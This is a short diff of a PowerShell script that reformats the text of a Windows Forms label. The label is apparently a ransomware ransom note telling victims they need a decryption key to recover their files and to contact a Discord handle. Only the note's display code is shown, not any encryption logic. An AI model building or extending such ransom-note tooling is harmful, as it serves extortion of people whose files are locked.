@@ -121,10 +121,7 @@ $label.AutoSize = $true
 $label.Location = New-Object System.Drawing.Point(60, 200)
 
 $label2 = New-Object Windows.Forms.Label
-$label2.Text = " To recover your files you will need the Decryption Key `n`n`n Run the Decryptor script and enter the key to recover files `n`n`n You can close this window when Decryption is complete
-Message me on Discord @Rdeviouz"
-
-
+$label2.Text = " To recover your files you will need the Decryption Key `n`n`n Run the Decryptor script and enter the key to recover files `n`n`n You can close this window when Decryption is complete `n`n`n Message me on Discord @Rdeviouz"
 $label2.AutoSize = $true
 $label2.Location = New-Object System.Drawing.Point(60, 280)
 
